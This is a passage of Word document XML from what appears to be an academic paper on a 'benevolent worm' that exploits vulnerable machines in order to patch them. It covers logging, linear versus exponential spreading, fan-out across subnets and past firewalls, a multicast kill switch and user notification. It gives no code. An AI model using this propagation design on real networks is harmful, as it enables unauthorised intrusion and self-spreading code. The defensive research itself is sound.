      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> should be any configuration settings used when the worm was seeded</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> such as the targets or network controls</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00A1369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w:t>
      </w:r>
      <w:r w:rsidR="00214BCE">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important entry contains</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> information about the source machine that triggered </w:t>
      </w:r>
      <w:r w:rsidR="00381281">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> worm.  Information such as the source IP </w:t>
      </w:r>
      <w:r w:rsidR="00381281">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>address of the machine that just exploited the worm on the target system as well as the original seed for the worm are useful for tracing the path the worm took.</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  If the worm is running on the first machine</w:t>
      </w:r>
      <w:r w:rsidR="00381281">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (seed)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it should simply state it is the source.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00381281" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>The verification of the benevolent worm’s actions as according to the log entries must satisfy three properties:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00381281"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381281">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ASSERT(statement was executed as claimed)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00381281" w:rsidRDefault="00CB26A3" w:rsidP="00381281">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00381281">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Inspect registry, maybe even scan binaries</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00381281"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381281">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ASSERT(statement N+1 occurred after statement N for all N)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00381281"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381281">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ASSERT(there were no intervening statements that could undo any of the previous assertions)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00381281" w:rsidRDefault="00CB26A3" w:rsidP="00381281">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00381281">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i.e. The user or a malicious program didn’t uninstall an installed update</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Again this is assuming that the log hasn’t been tampered with by another entity so as to remove data or insert fake data.  Detection of log tampering may be possible if the order of events indicates that an update was installed when in reality it wasn’t possible for it to be installed until another update patch was installed first (assertion #2).</w:t>
      </w:r>
      <w:r w:rsidR="004C70CE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  Additionally missing statements that were expected could indicate tampering.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc321736794"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>Network Congestion Control</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00EC21DD"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worm must be provided with a network range or list to target.  This may just be a range given by the person initiating or seeding the worm.  It could also be a specific list of known IP addresses that should be targeted.  Either way the speed or rate at which the worm attempts to spread itself must be controlled.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00651298"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 malicious worm is typically interested in spreading as quickly as it can.  An exponential approach is generally used where random targets are chosen.  For a benevolent worm spreading at a linear rate is more desirable because it reduces the chance of out-of-control network congestion.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  Although this is slower it can still achieve the goal of patching vulnerable systems.  </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>My implementation uses the following algorithm for choosing a target:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="0065129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Take the next target IP from a list of IPs to target</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="0065129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Attempt to exploit the target</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B4043E" w:rsidRDefault="00B4043E" w:rsidP="00651298">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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target was not exploited </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00651298">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>didn’t exist or not vulnerable)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00B4043E" w:rsidP="00B4043E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2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next target in the list</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF56AB" w:rsidRDefault="00FF56AB" w:rsidP="00FF56AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="2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list is exhausted worm simply exits</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF56AB" w:rsidRPr="00651298" w:rsidRDefault="00FF56AB" w:rsidP="00B4043E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2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starting at step 2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="0065129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If the target was exploited</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00651298" w:rsidRDefault="00CB26A3" w:rsidP="00FF56AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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Upload the worm code</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00651298" w:rsidRDefault="00CB26A3" w:rsidP="00426F89">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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Start remote execution of the worm</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00651298" w:rsidRDefault="00CB26A3" w:rsidP="00075821">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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Send the remote worm the remaining list</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00651298" w:rsidRDefault="00075821" w:rsidP="00075821">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2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B26A3" w:rsidRPr="00651298">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>orm continues attempting to spread</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on new target</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="0065129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651298">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Current worm simply exits</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 xml:space="preserve">This implementation is a simple hop-to-hop linear approach.  It doesn’t take into account what happens if one of the hops is rebooted or disconnected while the worm is attempting to spread again.  One possible solution would be to have previous nodes in the chain continue to run and do keep-alive checks of other nodes.  If another node stops responding then the node doing the keep-alive check could resume the target list.  This leaves a small possibility that a network division could cause the worm to spread from multiple systems at the same time, but if the network is partitioned this is desirable anyway.  In the worst case all nodes would have the worm running on them, all nodes become disconnected, each node tries to resume spreading the worm in fail-over mode, and then all nodes become connected again.  This would lead to a </w:t>
      </w:r>
      <w:r w:rsidR="00CB2846">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">possible </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>surge of traffic when all the nodes are connected once again.  A solution would be to have nodes on a local subnet send a broadcast packet stating they are trying to spread on the network.  If a node sees many broadcasts from other nodes then the nodes could all back-off and do an election on who should try to propagate next.</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 </w:t>
      </w:r>
      <w:r w:rsidR="00BC0AB9">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 xml:space="preserve">The primary concern </w:t>
      </w:r>
      <w:r w:rsidR="00BC0AB9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">is </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>avoiding congestion of the network</w:t>
      </w:r>
      <w:r w:rsidR="00BC0AB9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> caused by the worm</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  Since only one system will be spreading the worm at a time this minimizes network traffic even though it is much slower when compared to </w:t>
      </w:r>
      <w:r w:rsidR="00BC0AB9" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>exponential</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> spreading.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00FA59A6"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Another method would be to have one node act as a central node which does all of the exploit attempts.  Nodes that are compromised would simply run the benevolent worm code to patch the system and report back to the central node when they were done.  The disadvantage is that some nodes may not be reachable from a central node but are by the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r neighbors or peers.  This would have the advantage of being able to more easily stop the spread of the benevolent worm if such a need arises.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D56A4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B26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Yet another case to consider in hop-to-hop is being able to reach nodes behind firewalls.  If a node in the chain exploits another node and that new node tries to reach another node it may be blocked by firewalls whereas the first node may not be.  So whenever a node has a failure in exploiting a node it should report that failure to its parent or other peers so they can attempt to reach the desired node through a different route.  This is akin to a flooding technique although in order to scale logic about network routes and topology would have to be used to actually limit the traffic sent.  Selection of a nearby node with access to a different network may be useful in this case.  This network graph theory problem is left to further research.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00C7758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alternative</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> possibility is to also use a split strategy for distribution.  By reading the local routing table the worm could choose to fan out on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>local network (which typically ha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s lots of bandwidth) </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>and fan in on non-local network.  For example, a node could choose to spread to 10 targets when they fall on a subnet that the node is connected to but only do 1 target when it would go through the default gateway (and probably limited bandwidth WAN) instead.  This would give exponential behavior on the local network and linear on any non-local networks.</w:t>
      </w:r>
      <w:r w:rsidR="00B315C5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  To prevent local network congestion the fan out could also be limited so that only X parallel linear streams of the worm are started.  Further hops would not continue to fan out but remain linear and divide the target list evenly.  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc321736795"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Semi-autonomous Replication</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
      <w:r w:rsidRPr="00861880">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00E8549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In addition to the controls specified in “Network Congestion Control” it is also desirable that the benevolent worm could be seeded inside a particular network.  A network administrator could begin the execution on a trusted machine and instruct the worm via configuration options to only spread onto machines with a given local network address block.  The worm would only spread to subnets specified in the configuration and never venture out of that range even if links </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>are provided by infected targets.  This could also allow for a centralized server to be used for reporting back results inside the network.  In this case the network administrator could make user notification optional or simply state on the machine that it will be patched without any Cancel option.  A termination option such as a specific date and time could also be provided and controlled by the network administrator.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00E8549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Additionally</w:t>
      </w:r>
      <w:r w:rsidR="008C5950">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a kill-switch should be made available to terminate the execution of the worm over a multicast network port.  This allows for shutting down a worm on a segment or subnet of a network in an efficient manner.  Usefulness of such a kill switch would be to provide a network administrator the ability to stop an already spreading worm inside their network.  This does, however, have the limitation that a malicious worm or person could also stop the benevolent worm on a local network from continuing to propagate.  One possible solution would be to have some type of authentication mechanism so that only certain nodes could transmit the signal.  Such a scheme could be spoofed however.  Another possible solution would be to only accept the signal if it was known to come from a node that had the benevolent worm successfully </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ran</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on with perhaps a quorum of successfully patched nodes agreeing to a shutdown signal.  It would still be possible to fake by a malicious worm/program/attacker, but it would require a majority quorum of compromised systems.  A method of detecting spoofed IP packets may still be necessary though to determine if a voting node really did vote or not.  This may be best accomplished by the worm querying its parent (node that transmitted it to the current machine) instead of relying solely on a broadcast (if the parent is still accessible).  A malicious worm/program/attacker that was spoofing kill signal packets would be ignored for nodes known to not be in the benevolent worm graph and for spoofed nodes in the graph the benevolent worm could query other nodes to first check if they actually sent a kill signal.  Successful exploitation </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>would then require that the malicious program be able to either control packets going into the querying node or a majority control of nodes in the benevolent worm graph.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc321736796"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Notification</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="008B2E2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end-user, whether an administrator or regular user on the machine, should be notified that the worm will execute repairs and continue to spread in X time units unless the user selects Cancel.  The default should be “Go Ahead” for the user to click on.  This could affect the spread of the worm as noted in the “Network Congestion Control” section.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00DA06A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If no user is currently logged on the message should be displayed on the login screen.  In the event that the system was suspended (sleep or hibernate) upon resuming the worm should continue the countdown.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00DA06A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Other useful information would be a URI link that could take the user to a website to explain the purpose of the worm and why their system is vulnerable.  This could also be set to a custom link for a particular network if a network administrator seeded the worm on their network to begin with.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00DA06A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874">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The test</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> implementation currently lacks any notification mechanism</w:t>
      </w:r>
      <w:r w:rsidR="00A932C7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> since the answer was always going to be yes.  The best way to provide this notification and present it is left as a future work.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc321736797"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Undo</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
